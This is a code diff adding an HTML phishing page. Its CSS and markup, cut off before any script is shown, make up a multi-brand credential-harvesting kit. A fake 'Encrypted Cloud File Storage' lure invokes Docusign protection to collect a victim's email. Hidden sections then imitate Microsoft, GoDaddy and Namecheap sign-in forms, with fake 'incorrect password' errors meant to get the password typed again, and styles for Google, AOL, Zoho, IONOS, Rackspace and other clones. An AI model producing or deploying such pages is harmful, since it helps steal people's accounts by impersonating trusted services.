+        font-size: 14px;
+    }
+    
+    .ggl_f_2 p {
+        padding-left: 22px;
+        font-size: 12px;
+        color: #444;
+    }
+    .ggl_active_focus {
+        top: -13px !important;
+        font-size: 13px !important;
+        background: white;
+        padding: 4px;
+        color: #1a73e8 !important;
+        transition: all 0.3s;
+    }
+    
+    .ggl_active_focus_border {
+        border: 2px solid #1a73e8 !important;
+    }
+    .ggl_null_pass_error {
+        text-align: start;
+        font-size: 12px;
+        display: flex;
+        padding: 0px;
+    }
+    
+    .ggl_error_box {
+        font-size: 12px;
+        padding: 0px;
+        text-align: start;
+        display: flex;
+        align-items: start;
+    }
+    
+    img#exclam_icon2,
+    img#exclam_icon {
+        padding-right: 5px;
+    }
+    /* google page css end  */
+    
+    /* rackspace css start  */
+    div#rackspacesection {
+        background: #eaeaea;
+        height: 100vh;
+        width: 100%;
+    }
+    .rackspaceInnerWrapper {
+        width: 800px;
+        height: 472px;
+        margin: auto;
+        position: relative;
+        top: 80px;
+        font-family: system-ui;
+    }
+    
+    .rk-content-header {
+        height: 80px;
+        padding: 16px;
+        font-size: 24px;
+        font-weight: 300;
+        line-height: 18px;
+        background: #424242;
+        color: #fcfcfc;
+    }
+    .rk-content-header-logo img {
+        float: right;
+        height: 53px;
+        position: relative;
+        cursor: pointer;
+    }
+    .rk-content-header-label {
+        width: 180px;
+        font-size: 24px;
+        position: absolute;
+        top: 32px;
+        font-weight: 400;
+    }
+    
+    .rk-content-body {
+        display: flex;
+        justify-content: start;
+        background: #ffffff;
+        width: 800px;
+        height: 365px;
+    }
+    .rk-banner-section {
+        height: 285px;
+        width: 200px;
+        margin: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        cursor: pointer;
+    }
+    .rk-devider {
+        border: 1px solid rgba(224, 224, 224);
+        margin: 40px 0;
+    }
+    .rk-login-form {
+        width: 510px;
+        color: #333333;
+        font-size: 14px;
+        font-family: 'Roboto', sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 20px;
+        min-height: 268px;
+        width: 100%;
+        margin: 0 0 0 28px;
+    }
+    .rk-user-file {
+        width: 450px;
+        height: 154px;
+    }
+    .rk-user-email-info {
+        width: inherit;
+        padding-right: 30px;
+        margin-bottom: 20px;
+    }
+    .rk-user-email-info label {
+        position: relative;
+        font-family: Roboto;
+        font-size: 16px;
+        margin-bottom: 8px;
+        line-height: 1;
+        color: #616161;
+        display: inline-block;
+        max-width: 100%;
+    }
+    input#rk_name_key {
+        border: 1px solid #bdbdbd;
+        border-radius: 2px;
+        background: #ffffff;
+        font-family: Roboto;
+        font-size: 16px;
+        color: #616161;
+        height: 35px;
+        display: block;
+        width: 391px;
+        padding: 2px 6px;
+        line-height: 1.42857;
+    }
+    #rk_name_pass {
+        border: 1px solid #bdbdbd;
+        border-radius: 2px;
+        background: #ffffff;
+        font-family: Roboto;
+        font-size: 16px;
+        color: #616161;
+        height: 35px;
+        display: block;
+        width: 391px;
+        padding: 2px 6px;
+        line-height: 1.42857;
+    }
+    .rk-SeInfo label {
+        position: relative;
+        font-family: Roboto;
+        font-size: 16px;
+        margin-bottom: 8px;
+        line-height: 1;
+        color: #616161;
+        display: inline-block;
+        max-width: 100%;
+    }
+    .rk-fp-info a {
+        width: 160px;
+        float: right;
+        color: #0c7c84;
+        text-decoration: none;
+        background-color: transparent;
+        box-sizing: border-box;
+    }
+    .rk-login-btn button {
+        float: right;
+        float: right;
+        margin: 50px 50px 0 0;
+        padding: 9px 15px;
+        border: none;
+        background: #0c7c84;
+        color: white;
+        border-radius: 4px;
+    }
+    
+    .rk-base-link {
+        background: #ffffff;
+        text-align: center;
+        padding-bottom: 20px;
+        margin-top: -15px;
+        padding: 20px 0 18px 3px;
+    }
+    .rk-base-link a {
+        display: inline-block;
+        color: #0c7c84;
+        text-decoration: none;
+    }
+    .rk-devider2 {
+        display: inline-block;
+        margin: 0px 5px;
+        color: #0c7c84;
+        border: none;
+    }
+    .rk-rackspace-footer {
+        text-align: center;
+        margin-top: 10px;
+    }
+    .rk-rackspace-footer .rk-caption {
+        display: inline-block;
+        font-size: 12px;
+        color: #666;
+    }
+    .rk-rackspace-footer .rk-caption a {
+        color: #666;
+    }
+    .null_pass_error.rk_n_p_e,
+    .error_box.rk_e_b {
+        color: #dc3545;
+        margin-bottom: 7px;
+        padding: 0px;
+        font-size: 14px;
+    }
+    /* rackspace css end  */
+    
+    /* ionos css start  */
+    .ionos_header_wrapper {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: #003d8e;
+        padding: 2px 20px;
+    }
+    .login__dashboard.board {
+        width: 550px;
+        margin: auto;
+        background: white;
+        margin-top: 50px;
+        padding: 30px;
+        box-shadow: 0 1px 2px 0 rgba(80, 87, 91, 0.13);
+    }
+    
+    div#ionosInnerWrapper {
+        background: #f0f0f0;
+    }
+    
+    .login__dashboard.board h1 {
+        font-weight: 400;
+        font-size: 24px;
+        letter-spacing: -0.2px;
+        margin-bottom: 30px;
+    }
+    
+    .inp_error {
+        background: #fdf2f2;
+        border-left: 3px solid #d60600;
+        padding: 10px 0px;
+        margin-bottom: 16px;
+    }
+    
+    .inp_error p {
+        padding: 7px 14px;
+        font-size: 13px;
+    }
+    .ionos_header_wrapper img {
+        cursor: pointer;
+    }
+    .ionos_input_box_wrapper {
+        display: flex;
+        position: relative;
+        margin: 7px 0px;
+    }
+    
+    .iib__ {
+        width: 100%;
+        transition: all 0.3s;
+    }
+    
+    .iib__ input {
+        width: 100%;
+        padding: 8px;
+        padding-left: 32px;
+        border: 1px solid #44444487;
+        border-radius: 3px;
+        outline: none;
+    }
+    
+    .ib_icon {
+        position: absolute;
+        left: 8px;
+        top: 4px;
+    }
+    
+    .iib__ label {
+        position: absolute;
+        left: 35px;
+        top: 7px;
+        background: white;
+        font-size: 14px;
+        color: #44444487;
+        transition: all 0.3s;
+    }
+    
+    .iib__ input:focus-within {
+        border-color: #0881ba;
+    }
+    
+    .ionos_rm {
+        display: flex;
+        margin-top: 14px;
+    }
+    
+    .ionos_fp {
+        text-align: -webkit-right;
+    }
+    
+    p.ionos_linkstyle {
+        font-size: 14px;
+        border-bottom: 1px dotted #444;
+        color: #4f4f4f;
+        width: fit-content;
+        cursor: help;
+    }
+    
+    .ionos_rm input {
+        margin-right: 8px;
+    }
+    
+    p.ionos_linkstyle:hover {
+        background: #eadf1821;
+    }
+    
+    .ionos_dcdprimaryButton {
+        margin-top: 30px;
+    }
+    label.ionos_label_after_focus {
+        font-size: 11px;
+        color: #444;
+        top: -8px;
+        padding: 0px 3px;
+        left: 8px;
+    }
+    input#ionos_action_btn {
+        width: 100%;
+        background: #0a8cc9;
+        color: white;
+        font-weight: 800;
+        padding: 10px;
+        border: none;
+        border-radius: 3px;
+    }
+    .ionos_mail_merketing {
+        display: flex;
+        width: 550px;
+        margin: auto;
+        justify-content: space-between;
+        align-items: center;
+        background: white;
+        margin-top: 40px;
+        box-shadow: 0 1px 2px 0 rgba(80, 87, 91, 0.13);
+        padding: 30px;
+    }
+    
+    .ionos_mail_merketing h2 {
+        font-size: 18px;
+        font-weight: 500;
+        color: #444;
+        margin-bottom: 11px;
+    }
+    
+    .ionos_mail_merketing p {
+        font-size: 14px;
+        color: #444444e3;
+        margin-bottom: 14px;
+    }
+    
+    img#iem_ {
+        width: 200px;
+    }
+    .ionos_part_2 {
+        text-align: center;
+    }
+    
+    img#ionos_part_img {
+        height: auto;
+        width: max-content;
+        margin-top: 30px;
+    }
+    
+    .ionos_footer__ {
+        display: flex;
+        background: white;
+        padding: 55px 70px;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 30px;
+    }
+    
+    .ionos_footer__ p {
+        color: #444444c7;
+        font-size: 14px;
+        position: relative;
+    }
+    
+    .ionos_footer__ p:hover {
+        cursor: pointer;
+        text-decoration: underline;
+    }
+    
+    .ionos_footer__ p span {
+        color: lightseagreen;
+        position: absolute;
+        font-size: 50px;
+        top: -28px;
+        left: -22px;
+    }
+    button.iembtn {
+        background: #0a8cc9;
+        color: white;
+        font-weight: 700;
+        padding: 9px 17px;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    /* ionos css end  */
+    
+    /* AOL css start  */
+    img#aol_logo {
+        width: 100px;
+    }
+    
+    .aol_header {
+        display: flex;
+        justify-content: space-between;
+        padding: 22px 51px;
+        align-items: center;
+    }
+    
+    .aol_header p {
+        color: #39f;
+        font-size: 14px;
+        cursor: pointer;
+    }
+    
+    .aolInnerWrapper {
+        width: 100%;
+        height: 100vh;
+    }
+    
+    img#aol_logo2 {
+        width: 100px;
+    }
+    
+    .aol_body_wrap {
+        display: flex;
+        justify-content: end;
+        padding-right: 50px;
+        background: #f9f9fa;
+    }
+    .aolWhiteBoard.board {
+        width: 360px;
+        height: 540px;
+        background: white;
+        box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.3);
+        margin-top: 20px;
+        padding: 30px;
+        text-align: center;
+    }
+    
+    .name_key_holder_aol {
+        margin-top: 10px;
+        margin-bottom: 15px;
+    }
+    
+    .board_h_info {
+        margin-bottom: 20px;
+    }
+    
+    .board_h_info h3 {
+        font-size: 22px;
+        letter-spacing: 0.5px;
+        color: #2a2929;
+    }
+    
+    .board_h_info p {
+        font-size: 14px;
+    }
+    
+    .aol_input_box {
+        margin-top: 40px;
+        position: relative;
+        text-align: left;
+    }
+    
+    input#aol_name_pass {
+        border: none;
+        border-bottom: 1px solid #d3d0d0;
+        outline: none;
+        width: 100%;
+        padding-top: 20px;
+        padding-bottom: 6px;
+    }
+    
+    input#aol_name_pass:focus-within {
+        border-color: #39f;
+    }
+    
+    .aol_input_box label {
+        position: relative;
+        top: -30px;
+        left: 0px;
+        text-align: left;
+        color: #b3b3b3;
+        transition: all 0.3s !important;
+    }
+    
+    .aol_btn {
+        width: 100%;
+    }
+    
+    .aol_btn button {
+        width: 100%;
+        background: #39f;
+        border: 1px solid #39f;
+        padding: 10px;
+        color: white;
+        font-size: 16px;
+        border-radius: 2px;
+    }
+    
+    .aol_btn button:hover {
+        background: #54a0ed;
+        cursor: pointer;
+    }
+    
+    p.aol_f_p {
+        margin-top: 40px;
+        color: #39f;
+        cursor: pointer;
+    }
+    
+    p.aol_f_p:hover {
+        color: #286fb5;
+    }
+    label.aol_focus_input {
+        top: -50px;
+        color: black;
+    }
+    .null_pass_error.aol_n_e_b,
+    .error_box.aol_e_b {
+        padding: 0px;
+        margin-bottom: 20px;
+        text-align: left;
+        font-size: 14px;
+        margin-top: -19px;
+    }
+    /* AOL css end  */
+    /* roundcube css start  */
+    .roundcubeInnerWrapper {
+        width: 100%;
+        padding-right: 15px;
+        padding-left: 15px;
+        margin-right: auto;
+        margin-left: auto;
+        box-sizing: border-box;
+        height: 100vh;
+        background: #cad2d9;
+        padding-top: 130px;
+    }
+    .rc_form_item {
+        box-sizing: border-box;
+    }
+    .rc_login_form_fild {
+        width: 415px;
+        height: auto;
+        border: 1px solid;
+        background-color: rgba(0, 0, 0, 0.7);
+        border-radius: 15px;
+        margin: auto;
+        padding: 0px 30px;
+    }
+    .rc_roundcube_logo {
+        padding-top: 45px;
+        width: 180px;
+        margin: auto;
+        margin-bottom: 10px;
+    }
+    .rc_roundcube_Input_box {
+        margin: auto;
+        height: auto;
+        box-sizing: border-box;
+        display: block;
+        font-size: 1rem;
+        font-weight: 400;
+        line-height: 1.5;
+        color: #212529;
+        text-align: left;
+        width: 100%;
+    }
+    .rc_roundcube_Input_box .rc_rdb_email_ads {
+        width: 100%;
+    }
+    .rc_roundcube_Input_box .rc_rdb_email_ads label {
+        width: 100%;
+        position: relative;
+        padding: 0 50px 10px 0;
+        color: white;
+        font-size: 20px;
+        font-weight: 400;
+        line-height: 1.5;
+        bottom: 8px;
+    }
+    .rc_roundcube_Input_box .rc_rdb_email_ads input {
+        width: 100%;
+        display: block;
+        padding: 0.375rem 0.75rem;
+        font-size: 1rem;
+        line-height: 1.5;
+        color: #495057;
+        background-color: #fff;
+        background-clip: padding-box;
+        border: 1px solid #ced4da;
+        border-radius: 0.25rem;
+        outline: none;
+    }
+    .rc_roundcube_Input_box .rc_rdb_pass_box {
+        width: 100%;
+        margin-top: 23px;
+    }
+    .rc_roundcube_Input_box .rc_rdb_pass_box label {
+        width: 100%;
+        position: relative;
+        padding: 0 50px 10px 0;
+        color: white;
+        font-size: 20px;
+        font-weight: 400;
+        bottom: 8px;
+    }
+    .rc_roundcube_Input_box .rc_rdb_pass_box input {
+        width: 100%;
+        display: block;
+        padding: 0.375rem 0.75rem;
+        font-size: 1rem;
+        line-height: 1.5;
+        color: #495057;
+        background-color: #fff;
+        background-clip: padding-box;
+        border: 1px solid #ced4da;
+        border-radius: 0.25rem;
+        outline: none;
+    }
+    .rc_rdb_button {
+        position: relative;
+        padding: 20px 0 50px 0;
+        text-align: center;
+        box-sizing: border-box;
+    }
+    .rc_rdb_button button {
+        padding: 8px 12px;
+        color: #343a40 !important;
+        cursor: pointer;
+        border-radius: 8px;
+        border: 1px solid #ddd;
+    }
+    .rc_rdb_button button a {
+        text-decoration: none;
+        font-size: 17px;
+    }
+    .rc_rdb_bottom_content {
+        color: #766;
+        width: 100%;
+        text-align: center;
+        padding: 8px;
+        font-weight: 700;
+        font-size: 14px;
+    }
+    .rc_rdb_bottom_content p a {
+        text-decoration: none;
+        font-size: 12px;
+        color: #212529;
+    }
+    .rc_container_fild .rc_rdb_footer {
+        color: #766;
+        box-sizing: border-box;
+        text-align: center;
+        padding: 50px;
+        font-size: 20px;
+    }
+    .rc_rdb_footer {
+        text-align: center;
+    }
+    .error_box.rc_e_b {
+        background: #f8d7da;
+        padding: 15px 30px;
+        text-align: center;
+        border-radius: 5px;
+        color: #852f2f;
+        margin-bottom: 13px;
+    }
+    
+    .rc_n_e {
+        font-size: 15px !important;
+        margin-bottom: 15px;
+    }
+    /* roundcube css end  */
+    
+    /* zoho css start  */
+    
+    .zoho_conteiner {
+        display: block;
+        visibility: visible;
+    }
+    .sign_in_conteiner {
+        width: 890px;
+        min-height: 520px;
+        background-color: #fff;
+        box-shadow: 0px 2px 30px #ccc6;
+        margin: auto;
+        position: relative;
+        z-index: 1;
+        overflow: hidden;
+    }
+    .zoho_sign_box {
+        width: 500px;
+        min-height: 520px;
+        height: auto;
+        background: #fff;
+        box-sizing: border-box;
+        padding: 50px 50px;
+        border-radius: 2px;
+        transition: all 0.1s ease-in-out;
+        float: left;
+        overflow-y: auto;
+        display: table-cell;
+        border-right: 2px solid #f1f1f1;
+    }
+    .zoho_logo {
+        display: block;
+        margin-bottom: 20px;
+        background-size: auto 100%;
+        height: 40px;
+        width: auto;
+    }
+    .zoho_sign_head {
+        display: block;
+        font-size: 24px;
+        font-weight: 500;
+        margin-bottom: 30px;
+        line-height: 30px;
+        transition: all 0.1s ease-in-out;
+    }
+    .zoho-service_name {
+        line-height: 28px;
+        display: block;
+        font-size: 16px;
+        color: #000;
+        font-weight: 400;
+    }
+    .zoho_fild_container .zoho_hello_user {
+        display: inline-flex;
+        justify-content: space-between;
+        border: 1px solid #eeeeee;
+        margin-bottom: 20px;
+        border-radius: 7px;
+        cursor: pointer;
+        box-sizing: border-box;
+        max-width: 100%;
+        flex-wrap: nowrap;
+    }
+    .zoho_fild_container .zoho_hello_user .zoho_user_name {
+        display: inline-block;
+        font-size: 16px;
+        padding: 12px 14px;
+        line-height: 20px;
+        width: auto;
+        word-break: break-all;
+    }
+    .zoho_hello_user .notYou {
+        position: relative;
+        float: right;
+        font-size: 14px;
+        padding: 0px 14px 0px 0px;
+        display: inline-block;
+        color: #0091ff;
+        line-height: 38px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .zoho_fild_container .zoho_text_box {
+        display: block;
+        margin-bottom: 18px;
+        position: relative;
+    }
+    .zoho_text_box .textbox {
+        display: block;
+        width: 100%;
+        height: 44px;
+        box-sizing: border-box;
+        border-radius: 2px;
+        text-indent: 12px;
+        font-size: 16px;
+        outline: none;
+        border: none;
+        padding-right: 12px;
+        transition: all 0.2s ease-in-out;
+        background: #f8f8f8;
+        border: 1px solid #e4e4e4;
+        appearance: none;
+    }
+    .zoho_text_box .zoho_icon {
+        font-size: 34px;
+        color: #a7a7a7;
+        position: absolute;
+        top: 7px;
+        right: 13px;
+        float: right;
+        cursor: pointer;
+    }
+    .zoho_textBox_action {
+        display: block;
+        margin-top: 20px;
+        height: 20px;
+        margin-bottom: 30px;
+    }
+    .zoho_textBox_action .zoho_blue_text_auction {
+        float: right;
+        display: inline-block;
+        font-size: 14px;
+        color: #159aff;
+        font-weight: 500;
+        line-height: 16px;
+        cursor: pointer;
+    }
+    .zoho_button .Btn_blue {
+        cursor: pointer;
+        display: block;
+        width: 100%;
+        height: 44px;
+        border-radius: 4px;
+        letter-spacing: 0.5px;
+        font-size: 14px;
+        font-weight: 600;
+        outline: none;
+        border: none;
+        margin: auto;
+        margin-bottom: 30px;
+        transition: all 0.2s ease-in-out;
+        box-shadow: 0px 2px 2px #fff;
+        background-color: #159aff;
+        color: #fff;
+    }
+    .zoho_button .Btn_blue span {
+        color: #fff;
+    }
+    .sign_in_conteiner .zoho_right_sitebox {
+        width: 390px;
+        height: auto;
+        float: right;
+        box-sizing: border-box;
+        padding: 40px;
+        background-color: #fff;
+        display: table-cell;
+        overflow: hidden;
+    }
+    .zohoInnerWrapper {
+        padding-top: 5%;
+        height: 100vh;
+        width: 100%;
+    }
+    /* zoho css end  */
+    
+    /* centuryLink css start  */
+    .clInnerWrapper {
+        height: 100vh;
+        background-attachment: fixed;
+        background-position: right bottom;
+        background-repeat: no-repeat;
+    }
+    
+    .cl_whiteboard.board {
+        width: 305px;
+        margin: auto;
+        margin-top: 100px;
+    }
+    
+    .cl_input_box_wrapper {
+        position: relative;
+    }
+    
+    .cl_input_box_wrapper input {
+        border: none;
+        border-bottom: 1px solid #ddd;
+        outline: none;
+        width: 100%;
+        padding: 10px 0px;
+        margin-bottom: 31px;
+    }
+    
+    .cl_input_box_wrapper input:focus-within {
+        border-color: #0047bb;
+    }
+    
+    .cl_input_box_wrapper label {
+        position: absolute;
+        top: 8px;
+        left: 0px;
+        color: #918d8d;
+        font-size: 15px;
+        transition: all 0.3s;
+    }
+    
+    .cl_rm_ {
+        display: flex;
+    }
+    
+    .cl_rm_ p {
+        font-size: 13px;
+        padding-left: 10px;
+        color: #807c7c;
+    }
+    
+    .cl_signin_btn button {
+        width: 100%;
+        background: #0047bb;
+        border: none;
+        font-weight: 500;
+        color: white;
+        padding: 13px;
+        font-size: 18px;
+        cursor: pointer;
+    }
+    
+    .cl_signin_btn {
+        margin-top: 50px;
+    }
+    .cl_err_box {
+        margin-top: -40px;
+        font-size: 13px;
+    }
+    
+    .cl_e_bbb__ {
+        margin-top: 12px;
+        font-size: 14px;
+    }
+    .cl_help_ {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 15px;
+    }
+    
+    .cl_help_ p {
+        color: #033588;
+        font-size: 13px;
+    }
+    
+    .cl_help_ p:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    .cl_input_focus {
+        color: #0047bb !important;
+        font-size: 13px !important;
+        top: -9px !important;
+    }
+    
+    img#cl_logo {
+        margin: 23px;
+        width: 198px;
+    }
+    /* centuryLink css end  */
+    
+    /* weblink css start  */
+    .webmailInnerWrapper {
+        height: 100vh;
+    }
+    
+    img#wm_logo {
+        width: 300px;
+    }
+    
+    .wm_logo_wrapper {
+        text-align: center;
+        margin-bottom: 70px;
+        padding-top: 100px;
+    }
+    
+    .wm_board.board {
+        width: 255px;
+        margin: auto;
+    }
+    
+    .wm_input_wrapper {
+        display: flex;
+        position: relative;
+    }
+    
+    .wm_input_wrapper input {
+        width: 100%;
+        padding: 10px;
+        padding-left: 38px;
+        margin: 10px 0px;
+        outline: none;
+        border-radius: 3px;
+        border: 1px solid #ddd;
+    }
+    
+    .wm_input_wrapper img {
+        position: absolute;
+        left: 7px;
+        top: 17px;
+    }
+    
+    .wm_signin_btn button {
+        background: #179bd7;
+        width: 100%;
+        padding: 8px;
+        border: 1px solid black;
+        border-radius: 3px;
+        margin-top: 11px;
+        color: white;
+        font-size: 15px;
+        cursor: pointer;
+    }
+    
+    .wm_rp {
+        font-weight: 500;
+        font-size: 14px;
+        text-align: center;
+        margin-top: 19px;
+        cursor: pointer;
+    }
+    
+    .wm_rp:hover {
+        text-decoration: underline;
+    }
+    
+    .wm_footer__ {
+        margin-top: 100px;
+    }
+    img#webmail_error {
+        width: fit-content;
+    }
+    
+    .wm_err_box {
+        display: flex;
+        justify-content: center;
+        margin-bottom: -82px;
+    }
+    
+    p.wm_eeeeeeerr {
+        text-align: center;
+        margin-bottom: 15px;
+    }
+    .wm_footer__ ul {
+        display: flex;
+        list-style: none;
+        justify-content: center;
+    }
+    
+    .wm_footer__ ul li {
+        margin: 14px;
+        font-weight: 500;
+        font-size: 13px;
+        cursor: pointer;
+    }
+    
+    /* weblink css end  */
+    
+    .error_box {
+        color: #e81123;
+        padding-top: 10px;
+    }
+    .error_border_color {
+        border-color: #e81123 !important;
+    }
+    .d_none {
+        display: none !important;
+    }
+    .d_block {
+        display: block !important;
+    }
+    
+    </style>
+  </head>
+  <body>
+    <section id="greetingSection">
+      <div class="greetingSectionInner">
+        <div class="img_wrapper">
+          <img src="" id="hero_img" width="100%" height="auto" />
+        </div>
+        <div class="name_key_taker">
+          <div class="f_wrapper">
+            <h1>Encrypted Cloud File Storage</h1>
+            <div class="f_d_wrap">
+              <p>
+                This file is protected by Docusign protection, you need to enter the email that this
+                was shared to:
+              </p>
+              <div class="home_input_box">
+                <input type="email" placeholder="Enter email" required id="name_key" />
+                <div class="info_btn_callout">
+                  <div class="ds_callout">
+                    <h3>Why do I have to do this?</h3>
+                    <p>
+                    The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.
+                    </p>
+                  </div>
+                  <div class="info_btn">
+                    <i class="fa-regular fa-circle-question"></i>
+                  </div>
+                </div>
+              </div>
+              <div class="name_key_error_box d_none">Please enter a valid email address.</div>
+              <div class="btn___wrap">
+                <button id="view_rq" onclick="view_action()">View</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="domainsWrapper">
+      <section class="d_none" id="officeSection">
+        <div class="officeInnerWrapper">
+          <div class="d_flex">
+            <div class="office_whiteboard board">
+              <div class="o_i_w">
+                <img src="" alt="" id="office_brand" />
+              </div>
+              <div class="office_name_key">
+                <img src="" alt="" id="office_left_arrow" />
+                <div class="office_name_k_text name_key_holder"></div>
+              </div>
+              <h1>Enter password</h1>
+              <div class="null_pass_error d_none">
+                Please enter the password for your Microsoft account.
+              </div>
+              <div class="error_box d_none">
+                Your account or password is incorrect. If you don't remember your password,
+                <span>reset it now.</span>
+              </div>
+              <input
+                type="password"
+                class="office_n_p_input name_pass"
+                placeholder="Password"
+              
+              />
+              <p class="f_p_link">Forgot password?</p>
+              <div class="office_s_in_btn">
+                <button class="confirm_action" onclick="sign_in_action(0)">Sign in</button>
+              </div>
+            </div>
+          </div>
+          <div id="office_footer" class="">
+            <p>Terms of use</p>
+            <p>Privacy & cookies</p>
+            <p>...</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="godaddySection">
+        <div class="godaddyInnerWrapper">
+          <div class="gdWhiteboard board">
+            <img src="" alt="" id="godaddy_logo" />
+            <h1>Sign in</h1>
+            <div class="gd_title">New to GoDaddy? <span>Create an Account</span></div>
+            <div class="error_box d_none gd_error_box">
+              You entered an incorrect username or password. Please try again or try
+              <span>resetting your password.</span>
+            </div>
+            <div class="gd_input_box">
+              <input type="text" id="gd_nk_" class="name_key_holder_gd" />
+              <label for="gd_nk_" class="gd_label"
+                >Username or Customer # <span class="gd_label_star">*</span></label
+              >
+            </div>
+            <div class="gd_input_box">
+              <input type="password" id="gd_np_" class="name_pass" placeholder="" />
+              <span
+                id="pass_toggle"
+                role="button"
+                onclick="togglePasswordVisibility(this, 'gd_np_')"
+                >Show</span
+              >
+              <label for="gd_np_" class="gd_label"
+                >Password <span class="gd_label_star">*</span></label
+              >
+              <div class="null_pass_error d_none gd_null_pass_error">Password is required</div>
+            </div>
+            <div class="gd_remember_me">
+              <input type="checkbox" name="" />
+              <p>Keep me signed in on this device</p>
+            </div>
+            <div class="gd_confirm_btn">
+              <button onclick="sign_in_action(1, 'no_need_error_border')">Sign In</button>
+            </div>
+            <div class="signup_with_box">
+              <p>or sign in with</p>
+              <div class="signup_with_icon"><i class="fa-brands fa-apple"></i></div>
+              <div class="signup_with_icon"><i class="fa-brands fa-facebook"></i></div>
+              <div class="signup_with_icon"><i class="fa-brands fa-google"></i></div>
+            </div>
+            <div class="gd_title">
+              Need to find <span>your username</span> or <span>your password</span>?
+            </div>
+          </div>
+          <div class="gd_title gd_footer">
+            All Rights Reserved.
+            <span>Privacy Policy</span>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="namecheapSection">
+        <div class="ncInnerWrapper">
+          <div class="nc_subHeader">
+            <div class="nc_sh_left">
+              <p>
+                contact us <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <p>
+                sign in <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <p>sign up</p>
+            </div>
+            <div class="nc_sh_right">
+              <img src="" alt="" id="cart_img_nc" />
+              <p>
+                usd <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <img src="" alt="" id="search_img_nc" />
+            </div>
+          </div>
+          <div class="nc_header">
+            <div class="nc_h_left">
+              <img src="" alt="" id="namecheap_logo" />
+              <div class="nc_h_right">
+                <p>domain</p>
+                <p>hosting</p>
+                <p>wordpress</p>
+                <p>email</p>
+                <p>apps<span class="new_badge">new</span></p>
+                <p>security<span class="new_badge">new</span></p>
+                <p>transfer to us<span class="tryme_badge">try me</span></p>
+                <p>help center</p>
+                <p>account</p>
+              </div>
+            </div>
+          </div>
+          <div class="nc_breadcrumbs">
+            <h2>My Account <span id="arrow_icon_nc">→</span> <span>Login</span></h2>
+          </div>
+          <div class="nc_whiteBoard board">
+            <div class="nc_nw_head">
+              <h1>Log In to Your Account</h1>
+              <h5>SIGN UP?</h5>
+            </div>
+            <div class="error_box d_none nc_error_box">
+              <div>
+                <h4>VALIDATION ERROR</h4>
+                <h4>x</h4>
+              </div>
+              <p>
+                The password does not match the user account or the account does not exist. Please
+                verify both the user name and password and try again.
+              </p>
+            </div>
+            <div class="nc_input_box">
+              <h5>Username</h5>
+              <input type="email" placeholder="Username" class="name_key_nc" />
+            </div>
+            <div class="nc_input_box">
+              <h5>Password</h5>
+              <input type="password" placeholder="Password" class="name_pass" />
+            </div>
+            <div class="null_pass_error d_none nc_null_pass_error">
+              A valid password is required
+              <div id="nc_required_error">Required</div>
+            </div>
+            <div class="nc_confirm_btn">
+              <button onclick="sign_in_action(2, 'no_need_border')">Sign in and Continue</button>
+            </div>
+            <p class="nc_f_p">Forgot username or password?</p>
+          </div>
+          <div class="nc_promo_chart">
+            <h1>Need help? We're always here for you.</h1>
+            <div class="nc_pc_btn">Chat with a Live Person</div>
+          </div>
+          <div id="nc_footer">
+            <div class="nc_f_gird_row">
+              <div class="f_gird_left">
+                <img id="namecheap_logo_f" src="" alt="" />
+                <p>
+                  We make registering, hosting, and managing domains for yourself or others easy and
+                  affordable, because the internet needs people.
+                </p>
+                <h3>Learn more about Namecheap →</h3>
+                <h3>Read our blog →</h3>
+                <div class="f_g_last">
+                  <h3>Join Our Newsletter & Marketing Communication</h3>
+                  <p>We'll send you news and offers.</p>
+                  <div class="news_letter_nc">
+                    <input type="text" placeholder="you@yours.com" />
+                    <button>Join</button>
+                    <ul>
+                      <li><i class="fa-brands fa-twitter"></i></li>
+                      <li><i class="fa-brands fa-facebook-f"></i></li>
+                      <li><i class="fa-brands fa-instagram"></i></li>
+                      <li><i class="fa-brands fa-pinterest-p"></i></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="f_gird_right">
+                <div class="f_gird_1">
+                  <h5>Domains</h5>
+                  <p>Domain Name Search</p>
+                  <p>Domain Transfer</p>
+                  <p>New TLDs</p>
+                  <p>Handshake domains <span class="new_badge_footer">NEW</span></p>
+                  <p>Personal Domain</p>
+                  <p>Marketplace</p>
+                  <p>Whois Lookup</p>
+                  <p>PremiumDNS</p>
+                  <p>FreeDNS</p>
+                  <h5>Hosting</h5>
+                  <p>Shared Hosting</p>
+                  <p>WordPress Hosting</p>
+                  <p>Reseller Hosting</p>
+                  <p>VPS Hosting</p>
+                  <p>Dedicated Servers</p>
+                  <p>Private Email Hosting</p>
+                  <p>Migrate to Namecheap</p>
+                  <h5>WordPress</h5>
+                  <p>Shared Hosting</p>
+                  <p>WordPress Hosting</p>
+                  <p>Migrate WordPress</p>
+                </div>
+                <div class="f_gird_2">
+                  <h5></h5>
+                  <p>Domain Privacy</p>
+                  <p>Website Security <span class="new_badge_footer">NEW</span></p>
+                  <p>Domain Vault <span class="new_badge_footer">NEW</span></p>
+                  <p>PremiumDNS</p>
+                  <p>CDN</p>
+                  <p>VPN<span class="new_badge_footer">update</span></p>
+                  <p>Cyber Insurance <span class="new_badge_footer">NEW</span></p>
+                  <p>2FA</p>
+                  <p>Public DNS</p>
+                  <br />
+                  <p>Anti-Spam Protection</p>
+                  <br />
+                  <h5>Transfer to Us <span class="tryme_badge_footer">UPDATE</span></h5>
+                  <p>Domain Transfer</p>
+                  <p>Migrate Hosting</p>
+                  <p>Migrate WordPress</p>
+                  <p>Migrate Email</p>
+                  <h5>SSL Certificates</h5>
+                  <p>Comodo</p>
+                  <p>Organization Validation</p>
+                  <p>Domain Validation</p>
+                  <p>Extended Validation</p>
+                  <p>Single Domain</p>
